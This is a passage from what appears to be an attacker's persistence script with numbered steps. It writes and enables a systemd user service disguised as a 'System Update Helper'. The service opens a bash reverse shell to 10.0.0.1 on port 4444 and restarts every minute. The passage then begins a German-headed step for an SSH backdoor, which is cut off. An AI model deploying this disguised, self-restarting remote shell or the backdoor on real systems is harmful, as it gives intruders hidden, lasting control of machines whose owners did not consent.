[Unit]
Description=System Update Helper
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
Restart=always
RestartSec=60
[Install]
WantedBy=default.target
EOF
systemctl --user enable --now update-helper

# 2. SSH-Backdoor (eigener Key, keine Passphrases)
